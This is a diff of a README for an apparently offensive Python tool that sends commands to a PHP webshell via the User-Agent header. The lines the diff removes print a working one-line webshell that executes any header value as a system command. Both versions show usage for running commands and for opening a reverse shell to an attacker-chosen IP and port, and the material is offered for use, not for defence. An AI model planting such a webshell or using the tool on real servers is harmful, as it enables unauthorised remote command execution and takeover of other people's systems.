@@ -1,23 +1,20 @@
-this tool was created for automate process of make connections to  webshell by header
+This tool was created for automate process of make connections to  webshell by header
 
-for example, when there is a page webshell.php with this code bellow
-'''
-<?php system($_SERVER['HTTP_USER_AGENT'])?>
-'''
-the Header '''User-Agent''' is accepting code execution in the server 
+for example, when there is a page webshell.php and the Header <b>User-Agent</b> is accepting 
+code execution in the server 
 
 and you can execute commands as in the the example:
-'''
-User-Agent: ls
-'''
+
+<b>User-Agent: ls </b>
+
 
 <h1>How to use</h1>
 
-default connection:
+<b>default connection:</b>
 
 python3 connect.py [webpage] [Argument]
 
-Reverse Shell connection:
+<b>Reverse Shell connection:</b>
 
 python3 connect.py [webpage] [Argument] [reverse_shell_ip] [reverse_shell_port]
 
